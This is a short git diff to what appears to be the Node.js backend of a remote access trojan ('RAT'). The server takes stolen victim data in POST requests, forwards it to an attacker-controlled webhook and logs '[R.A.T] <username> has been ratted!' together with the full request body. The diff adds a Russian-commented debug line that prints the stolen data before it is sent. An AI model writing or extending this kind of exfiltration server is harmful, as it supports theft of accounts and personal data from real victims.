@@ -110,6 +110,9 @@ app.post("/", async (req, res) => {
             });
         }
 
+        // Логирование содержимого webhookData перед отправкой
+        console.log("Webhook Data:", JSON.stringify(webhookData, null, 2));
+
         await post(process.env.WEBHOOK, webhookData);
         console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`);
     } catch (err) {
